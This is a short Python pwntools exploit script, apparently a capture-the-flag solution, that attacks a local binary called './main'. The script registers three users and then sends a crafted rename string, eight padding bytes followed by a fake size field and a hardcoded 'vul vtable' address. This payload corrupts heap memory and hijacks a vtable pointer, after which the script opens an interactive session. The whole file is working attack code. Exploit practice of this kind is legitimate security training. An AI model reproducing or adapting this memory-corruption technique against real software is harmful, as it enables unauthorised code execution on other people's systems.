#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level = "debug"
r = process('./main')
# plz set the vul vtable addr
vtable_add =0x200eb0

_data='d'*8+p64(0x41)+p64(vtable_add)

def Main():
    r.recvuntil("Admin registration:\n")
    r.sendline("aaaa")
    r.recvuntil("UserA registration:\n")
    r.sendline("bbbb")
    r.recvuntil("UserB registration:\n")
    r.sendline("cccc")
    r.recvuntil("UserA Rename:\n")
    r.sendline(_data)
    r.recvuntil("Check UserB again:\n")

Main()
r.interactive()

